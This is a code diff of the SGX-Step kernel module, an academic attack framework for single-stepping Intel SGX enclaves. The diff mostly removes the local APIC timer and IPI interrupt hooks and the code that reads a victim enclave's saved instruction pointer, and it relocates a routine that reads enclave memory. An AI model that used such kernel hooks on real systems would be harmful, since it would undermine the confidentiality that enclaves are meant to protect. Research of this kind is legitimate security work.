@@ -34,8 +34,6 @@
 
 #include <linux/kallsyms.h>
 #include <linux/clockchips.h>
-#include <asm/apic.h>
-#include <asm/apicdef.h>
 
 #include "linux-sgx-driver/sgx.h"
 
@@ -44,76 +42,8 @@ MODULE_AUTHOR("Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>, Raoul Strackx <raoul.s
 MODULE_DESCRIPTION("SGX-Step: A Practical Attack Framework for Precise Enclave Execution Control");
 
 int target_cpu = -1;
-struct clock_event_device *levt = NULL;
-void (*event_handler)(struct clock_event_device *) = NULL;
-struct sgx_step_enclave_info victim = {0};
 
 typedef long (*apvm_t)(struct task_struct *tsk, unsigned long addr, void *buf, int len, int write);
-
-long edbgrd(unsigned long addr, void *buf, int len)
-{
-    apvm_t apvm;
-
-    /* access_process_vm will use the vm_operations defined by the isgx driver */
-    RET_ASSERT(apvm = (apvm_t) kallsyms_lookup_name("access_process_vm"));
-    return apvm(current, addr, buf, len, /*write=*/0);
-}
-
-unsigned long edbgrd_ssa(unsigned long tcs_addr, int ssa_field_offset)
-{
-    unsigned long ossa, ret, ssa_field_addr;
-
-    edbgrd(tcs_addr + SGX_TCS_OSSA_OFFSET, &ossa, 8);
-    ssa_field_addr = victim.base + ossa + SGX_SSAFRAMESIZE
-                     - SGX_GPRSGX_SIZE + ssa_field_offset;
-
-    edbgrd(ssa_field_addr, &ret, 8);
-    return ret;
-}
-
-int get_erip(void)
-{
-    struct pt_regs *regs = task_pt_regs(current);
-    unsigned long erip = 0x0;
-
-    RET_ASSERT(regs && victim.aep && victim.erip_pt);
-    if (regs->ip == victim.aep)
-    {
-        /* NOTE: we do not pass regs->rbx (which should contain &TCS), but
-           rather use the value provided by the untrusted runtime; for
-           regs->rbx somehow doesn't contain the right value here.. */
-        erip = edbgrd_ssa(victim.tcs, SGX_GPRSGX_RIP_OFFSET);
-        RET_ASSERT(!copy_to_user((void __user *) victim.erip_pt,
-                                 &erip, sizeof(erip)));
-    }
-    else
-    {
-        log("interrupted non-enclave code at %p", (void*) regs->ip);
-    }
-
-    return 0;
-}
-
-void attacker_lapic_event_handler(struct clock_event_device *dev)
-{
-    BUG_ON(!event_handler);
-
-    if (victim.aep && victim.erip_pt) get_erip();
-
-    /* XXX insert custom kernel-level, attack-specific code here */
-
-    event_handler(dev);
-}
-
-void attacker_ipi_handler(void)
-{
-    if (smp_processor_id() != target_cpu)
-        return;
-
-    if (victim.aep && victim.erip_pt) get_erip();
-
-    /* XXX insert custom kernel-level, attack-specific code here */
-}
 
 int step_open(struct inode *inode, struct file *file)
 {
@@ -124,8 +54,6 @@ int step_open(struct inode *inode, struct file *file)
     }
     target_cpu = smp_processor_id();
 
-    /* Hook IPI vector (cf. https://github.com/jovanbulck/sgx-pte) */
-    kvm_set_posted_intr_wakeup_handler(attacker_ipi_handler);
     return 0;
 }
 
@@ -133,19 +61,6 @@ int step_release(struct inode *inode, struct file *file)
 {
     target_cpu = -1;
 
-    /* Restore local APIC timer IRQ handler */
-    if (levt && event_handler)
-    {
-        levt->event_handler = event_handler;
-        log("local APIC timer event handler %p restored", event_handler);
-
-        // genuine handler puts kernel back in control of APIC timer deadline
-        event_handler(levt);
-        levt = NULL; event_handler = NULL;
-    }
-
-    /* Unhook IPI vector */
-    kvm_set_posted_intr_wakeup_handler(NULL);
     return 0;
 }
 
@@ -159,27 +74,19 @@ long sgx_step_ioctl_info(struct file *filep, unsigned int cmd, unsigned long arg
     RET_ASSERT(vma && (enclave = vma->vm_private_data));
     RET_ASSERT(info->aep && info->tcs);
 
-    victim.aep               = info->aep;
-    victim.tcs               = info->tcs;
-    victim.erip_pt           = info->erip_pt;
-    info->base = victim.base = enclave->base;
-    info->size = victim.size = enclave->size;
+    info->base = enclave->base;
+    info->size = enclave->size;
 
     return 0;
 }
 
-/* Wrap local APIC timer IRQ handler */
-long sgx_step_ioctl_lapic_hook(struct file *filep, unsigned int cmd, unsigned long arg)
+long edbgrd(unsigned long addr, void *buf, int len)
 {
-    void *lapic_events = NULL;
-    RET_ASSERT(lapic_events = (void*) kallsyms_lookup_name("lapic_events"));
-    RET_ASSERT(levt = this_cpu_ptr(lapic_events));
-    RET_ASSERT(!event_handler && (event_handler = levt->event_handler));
-    levt->event_handler = attacker_lapic_event_handler;
-    log("CPU %d local APIC timer IRQ handler hooked: %p (original); " \
-        "%p (wrapped)", smp_processor_id(), event_handler, levt->event_handler);
+    apvm_t apvm;
 
-    return 0;
+    /* access_process_vm will use the vm_operations defined by the isgx driver */
+    RET_ASSERT(apvm = (apvm_t) kallsyms_lookup_name("access_process_vm"));
+    return apvm(current, addr, buf, len, /*write=*/0);
 }
 
 long sgx_step_ioctl_edbgrd(struct file *filep, unsigned int cmd, unsigned long arg)
@@ -203,7 +110,6 @@ long sgx_step_ioctl_invpg(struct file *filep, unsigned int cmd, unsigned long ar
 
     return 0;
 }
-
 
 long sgx_step_get_pt_mapping(struct file *filep, unsigned int cmd, unsigned long arg)
 {
@@ -276,9 +182,6 @@ long step_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
     {
         case SGX_STEP_IOCTL_VICTIM_INFO:
             handler = sgx_step_ioctl_info;
-            break;
-        case SGX_STEP_IOCTL_LAPIC_HOOK:
-            handler = sgx_step_ioctl_lapic_hook;
             break;
         case SGX_STEP_IOCTL_GET_PT_MAPPING:
             handler = sgx_step_get_pt_mapping;
@@ -365,14 +268,7 @@ void cleanup_module(void)
     if (step_dev.this_device)
         misc_deregister(&step_dev);
 
-    /* Restore local APIC timer IRQ handler */
-    if (levt && event_handler)
-    {
-        levt->event_handler = event_handler;
-        log("local APIC timer event handler %p restored", event_handler);
-    }
 
     unregister_kretprobe(&krp);
-    kvm_set_posted_intr_wakeup_handler(NULL);
     log("kernel module unloaded");
 }
